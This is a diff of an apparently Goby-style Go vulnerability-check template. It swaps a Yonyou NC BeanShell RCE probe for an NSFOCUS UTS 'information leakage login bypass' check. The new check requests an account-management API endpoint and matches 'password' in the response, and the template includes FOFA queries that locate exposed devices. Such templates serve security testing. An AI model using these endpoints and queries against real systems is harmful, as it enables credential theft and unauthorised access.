@@ -6,15 +6,15 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "用友NC BeanShell RCE",
+  "Name": "绿盟 UTS综合威胁探针 信息泄露登陆绕过漏洞",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "GobyQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "Level": "3",
+  "FofaQuery": "app=\"NSFOCUS-UTS综合威胁探针\" || product=\"NSFOCUS-UTS综合威胁探针\"",
+  "GobyQuery": "app=\"NSFOCUS-UTS综合威胁探针\" || product=\"NSFOCUS-UTS综合威胁探针\"",
+  "Level": "2",
   "Impact": "",
   "Recommendation": "",
   "References": [],
@@ -30,7 +30,7 @@ func init() {
     {
       "Request": {
         "method": "GET",
-        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+        "uri": "/webapi/v1/system/accountmanage/account",
         "follow_redirect": true,
         "header": {},
         "data_type": "text",
@@ -51,7 +51,7 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "BeanShell",
+            "value": "password",
             "bz": ""
           }
         ]
@@ -107,7 +107,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "用友NC BeanShell RCE",
+      "Name": "绿盟 UTS综合威胁探针 信息泄露登陆绕过漏洞",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +116,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "yonyou NC BeanShell RCE",
+      "Name": "Lvmeng UTS comprehensive threat probe information leakage login bypass",
       "Product": "",
       "Description": "",
       "Recommendation": "",
